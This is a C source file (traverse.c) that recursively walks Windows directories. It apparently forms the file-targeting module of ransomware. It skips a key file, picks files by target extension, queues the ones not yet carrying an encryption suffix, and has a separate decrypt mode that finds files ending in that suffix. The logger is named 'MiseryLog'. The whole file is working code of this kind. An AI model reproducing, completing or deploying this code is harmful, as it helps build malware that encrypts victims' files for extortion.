// SPDX-License-Identifier: MIT
// traverse.c - Filesystem recursive traversal and filtering

#include "fops_internal.h"
#include "fops_log.h"
#include <shlobj.h>
#include <stdio.h>
#include <string.h>

extern void FopsEnqueue(FILEOPS_CTX *ctx, const WCHAR *fullPath);
extern bool FopsIsTargetExtension(const char *path);
extern bool FopsIsKeyFilePath(const char *path);

void FopsTraverseRecursive(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
    if (depth > MAX_DEPTH) return;
    if (ctx->config.pfnShouldSkip && ctx->config.pfnShouldSkip(dir)) return;

    WCHAR pattern[FILEOPS_MAX_PATH];
    _snwprintf(pattern, FILEOPS_MAX_PATH - 1, L"%s\\*", dir);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileExW(pattern, FindExInfoStandard, &fd, FindExSearchNameMatch, NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE) {
        char narrowDir[FILEOPS_MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, dir, -1, narrowDir, sizeof(narrowDir), NULL, NULL);
        MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open dir: %s (err: %lu)", narrowDir, GetLastError());
        return;
    }

    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;

        // FIX: Prevent infinite loops from Symlinks/Junctions unless explicitly allowed
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) && 
            !(ctx->config.flags & FILEOPS_FLAG_FOLLOW_SYMLINKS)) {
            continue;
        }

        WCHAR full[FILEOPS_MAX_PATH];
        int written = _snwprintf(full, FILEOPS_MAX_PATH - 1, L"%s\\%s", dir, fd.cFileName);
        if (written < 0 || written >= (int)(FILEOPS_MAX_PATH - 1)) continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            FopsTraverseRecursive(ctx, full, depth + 1);
        } else {
            char narrow[FILEOPS_MAX_PATH];
            if (WideCharToMultiByte(CP_UTF8, 0, full, -1, narrow, sizeof(narrow), NULL, NULL) <= 0)
                continue;

            if (ctx->config.decryptMode) {
                const char *encPos = NULL;
                for (const char *p = narrow; *p; p++) {
                    if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0) encPos = p;
                }
                if (!encPos || encPos[ENC_EXT_LEN] != '\0') continue;

                char origPath[FILEOPS_MAX_PATH];
                strncpy(origPath, narrow, sizeof(origPath) - 1);
                origPath[sizeof(origPath) - 1] = '\0';
                *(origPath + (encPos - narrow)) = '\0';

                if (GetFileAttributesA(origPath) != INVALID_FILE_ATTRIBUTES) continue;
                FopsEnqueue(ctx, full);
            } else {
                if (FopsIsKeyFilePath(narrow)) continue;
                if (!FopsIsTargetExtension(narrow)) continue;

                char encPath[FILEOPS_MAX_PATH];
                size_t pathLen = strlen(narrow);
                if (pathLen > FILEOPS_MAX_PATH - ENC_EXT_LEN - 1) continue;
                memcpy(encPath, narrow, pathLen);
                memcpy(encPath + pathLen, ENC_EXT, ENC_EXT_LEN);
                encPath[pathLen + ENC_EXT_LEN] = '\0';
                if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES) continue;

                FopsEnqueue(ctx, full);
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}